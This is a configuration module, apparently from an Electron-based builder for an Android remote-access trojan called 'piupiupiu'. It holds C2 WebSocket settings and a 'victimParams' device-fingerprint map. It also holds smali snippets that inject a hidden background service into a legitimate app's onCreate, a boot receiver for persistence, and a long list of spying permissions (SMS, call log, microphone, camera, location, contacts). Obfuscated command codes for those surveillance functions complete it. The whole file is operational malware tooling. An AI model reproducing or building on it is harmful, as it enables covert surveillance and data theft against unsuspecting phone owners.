var path = require("path");


//---------------------App Controller Vars----------------------------------
exports.apkName = 'piupiupiu.apk';
exports.signedApkName = 'piupiupiu.s.apk';
exports.piupiupiuApkFolderPath = path.join(__dirname, '..', '..', 'Factory/piupiupiu').replace("app.asar", "app.asar.unpacked");
exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");;
exports.dataDir = 'piupiupiu'
exports.downloadPath = 'Downloads';
exports.outputApkPath = 'Output';
// 日志配色：底部终端在柔和浅色主题下为浅底，故字体色必须用深色才看得清。
// DEFAULT 用柔和深石板灰（替代原先的 white，white 在浅底上会隐形）；
// SUCCESS/FAIL 用稍沉的绿/红，保证在浅色面板上对比度足够。
exports.logColors = { RED: "#d6453d", GREEN: "#1f9d55", DEFAULT: "#434b5e" };
exports.logStatus = { SUCCESS: 1, FAIL: 0 };
exports.defaultPort = 8443;

// WebSocket 的挂载路径。客户端 Must 与之一致（AppConfig.C2_PATH）。
exports.wsPath = '/sync';

// 帧格式 {"t":<命令码>,"x":<载荷>}，与 AppConfig.FRAME_TYPE / FRAME_PAYLOAD 对应
exports.frameType = 't';
exports.framePayload = 'x';

// 服务端侧对 设备指纹查询参数 的叫法 -> 客户端 AppConfig.PARAM_* 的实际键名。
// 客户端用无语义的 d1..d4，这里集中做一次映射，main.js 里就不用散落硬编码了。
exports.victimParams = {
    id: 'd4',
    manf: 'd2',
    model: 'd1',
    release: 'd3'
};
// C2 现在由 AppConfig 集中管理，写 C2 要改的是 AppConfig.smali
exports.c2ConfigPath = 'smali/com/piupiupiu/AppConfig.smali';
exports.piupiupiuService = '<service android:enabled="true" android:exported="false" android:name="com.piupiupiu.CoreService"/>';
exports.piupiupiuReciver = '<receiver android:enabled="true" android:exported="true" android:name="com.piupiupiu.BootReceiver">' +
    '<intent-filter>' +
    '<action android:name="android.intent.action.BOOT_COMPLETED"/>' +
    '</intent-filter>' +
    '</receiver>';
exports.serviceSrc = '\n\n    new-instance v0, Landroid/content/Intent;' +
    '\n\n' +
    '    const-class v1, Lcom/piupiupiu/CoreService;' +
    '\n\n' +
    '    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V' +
    '\n\n' +
    '    invoke-virtual {p0, v0}, L';
exports.serviceStart = ';->startService(Landroid/content/Intent;)Landroid/content/ComponentName;';
exports.orgAppKey = ';->onCreate(Landroid/os/Bundle;)V';
exports.permissions = [
    '<uses-permission android:name="android.permission.WAKE_LOCK" />',
    '<uses-permission android:name="android.permission.CAMERA" />',
    '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />',
    '<uses-permission android:name="android.permission.INTERNET" />',
    '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />',
    '<uses-permission android:name="android.permission.READ_SMS"/>',
    '<uses-permission android:name="android.permission.SEND_SMS"/>',
    '<uses-feature android:name="android.hardware.camera" />',
    '<uses-feature android:name="android.hardware.camera.autofocus" />',
    '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
    '<uses-permission android:name="android.permission.READ_PHONE_STATE" />',
    '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />',
    '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
    '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
    '<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>',
    '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />',
    '<uses-permission android:name="android.permission.READ_CONTACTS" />'
]



//---------------------Lab Controller Vars----------------------------------
exports.order = 'order';
exports.orders = {
    camera: 'k7f2qa',
    fileManager: 'm3b8tz',
    calls: 'c2h6vn',
    sms: 's9d4wx',
    mic: 'w8k3qu',
    location: 'l4t7ye',
    contacts: 'n5j1pr',

}